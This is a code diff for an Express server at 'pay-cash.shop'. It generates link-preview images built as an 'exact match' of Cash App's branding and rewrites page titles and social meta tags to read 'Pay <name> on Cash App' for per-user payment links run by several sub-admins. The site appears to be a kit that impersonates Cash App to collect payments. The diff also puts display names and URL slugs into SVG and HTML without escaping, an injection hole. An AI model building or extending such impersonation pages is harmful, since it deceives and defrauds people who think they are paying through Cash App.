@@ -68,7 +68,7 @@ async function sendPushNotification(userId: string | null, title: string, body: 
       try {
         await webpush.default.sendNotification(
           { endpoint: sub.endpoint, keys: { p256dh: sub.p256dh, auth: sub.auth } },
-          JSON.stringify({ title, body, icon: "/cashapp-logo.png" })
+          JSON.stringify({ title, body, icon: "/cashapp-logo.png", tag: title, url: "/admin" })
         );
       } catch { /**/ }
     }
@@ -76,19 +76,52 @@ async function sendPushNotification(userId: string | null, title: string, body: 
 }
 
 // ── OG Image ──
-app.get("/og-image.svg", async (_req, res) => {
-  const displayName = (await getSetting("display_name")) ?? "Pay Cash";
+app.get("/og-image.svg", async (req, res) => {
+  // Get username from query or use admin default
+  const username = req.query.u as string | undefined;
+  let displayName = (await getSetting("display_name")) ?? "Pay Cash";
+
+  if (username) {
+    // Try to get sub-admin display name
+    const [user] = await db.select({ displayName: usersTable.displayName })
+      .from(usersTable).where(and(eq(usersTable.username, username), eq(usersTable.status, "active")));
+    if (user) displayName = user.displayName;
+  }
+
   const initial = displayName.trim()[0]?.toUpperCase() ?? "P";
+
+  // Exact match: green bg, red circle top-left partially cut (center at ~148,0),
+  // black rounded rect top-right partially cut, bold name bottom-left
   const svg = `<svg width="1200" height="630" xmlns="http://www.w3.org/2000/svg">
+  <!-- Green background -->
   <rect width="1200" height="630" fill="#00D632"/>
-  <circle cx="148" cy="10" r="210" fill="#FF4444"/>
-  <text x="148" y="165" font-family="Arial,sans-serif" font-size="180" font-weight="900" fill="white" text-anchor="middle">${initial}</text>
-  <rect x="1010" y="-50" width="260" height="260" rx="56" fill="#111"/>
-  <text x="1140" y="168" font-family="Arial,sans-serif" font-size="160" font-weight="800" fill="none" stroke="#00D632" stroke-width="4" text-anchor="middle">$</text>
-  <text x="52" y="570" font-family="Arial,sans-serif" font-size="108" font-weight="900" fill="#000" letter-spacing="-3">${displayName}</text>
+
+  <!-- Red/coral circle top-left, partially cut off at top -->
+  <circle cx="155" cy="0" r="195" fill="#FF3B30"/>
+  <!-- First letter centered in visible circle area -->
+  <text x="155" y="135"
+    font-family="SF Pro Display, Helvetica Neue, Arial, sans-serif"
+    font-size="160" font-weight="900" fill="white"
+    text-anchor="middle" dominant-baseline="middle">${initial}</text>
+
+  <!-- Black rounded square top-right, cut off at top and right edges -->
+  <rect x="1030" y="-45" width="240" height="240" rx="48" fill="#0B0B0B"/>
+  <!-- Transparent $ green outline inside black square -->
+  <text x="1150" y="150"
+    font-family="SF Pro Display, Helvetica Neue, Arial, sans-serif"
+    font-size="148" font-weight="700"
+    fill="none" stroke="#00D632" stroke-width="3"
+    text-anchor="middle" dominant-baseline="middle">$</text>
+
+  <!-- Display name - bold, large, bottom-left, black -->
+  <text x="56" y="570"
+    font-family="SF Pro Display, Helvetica Neue Black, Arial Black, Arial, sans-serif"
+    font-size="96" font-weight="900" fill="#000000"
+    letter-spacing="-2">${displayName}</text>
 </svg>`;
+
   res.setHeader("Content-Type", "image/svg+xml");
-  res.setHeader("Cache-Control", "no-cache");
+  res.setHeader("Cache-Control", "no-cache, no-store");
   res.send(svg);
 });
 
@@ -543,7 +576,39 @@ app.post("/api/admin/sync", async (req, res) => {
 if (process.env.NODE_ENV === "production") {
   const publicDir = path.join(process.cwd(), "dist/public");
   app.use(express.static(publicDir));
-  app.get("/{*path}", (_req, res) => res.sendFile(path.join(publicDir, "index.html")));
+  app.get("/{*path}", async (req, res) => {
+    try {
+      const fs = await import("fs");
+      let html = fs.readFileSync(path.join(publicDir, "index.html"), "utf-8");
+
+      // Check if this is a payment page
+      const payMatch = req.path.match(/^\/pay\/([a-z0-9_-]+)$/i);
+      let displayName = (await getSetting("display_name")) ?? "Pay Cash";
+      let ogImageUrl = `https://pay-cash.shop/og-image.svg`;
+
+      if (payMatch) {
+        const slug = payMatch[1];
+        // Try sub-admin
+        const [user] = await db.select({ displayName: usersTable.displayName })
+          .from(usersTable).where(and(eq(usersTable.username, slug), eq(usersTable.status, "active")));
+        if (user) displayName = user.displayName;
+        ogImageUrl = `https://pay-cash.shop/og-image.svg?u=${slug}`;
+      }
+
+      const title = `Pay ${displayName} on Cash App`;
+      html = html
+        .replace(/<title>.*?<\/title>/, `<title>${title}</title>`)
+        .replace(/(<meta property="og:title"[^>]*content=")[^"]*(")/g, `$1${title}$2`)
+        .replace(/(<meta property="og:image"[^>]*content=")[^"]*(")/g, `$1${ogImageUrl}$2`)
+        .replace(/(<meta name="twitter:title"[^>]*content=")[^"]*(")/g, `$1${title}$2`)
+        .replace(/(<meta name="twitter:image"[^>]*content=")[^"]*(")/g, `$1${ogImageUrl}$2`);
+
+      res.setHeader("Content-Type", "text/html");
+      res.send(html);
+    } catch {
+      res.sendFile(path.join(process.cwd(), "dist/public", "index.html"));
+    }
+  });
 }
 
 const PORT = parseInt(process.env.PORT ?? "5000");
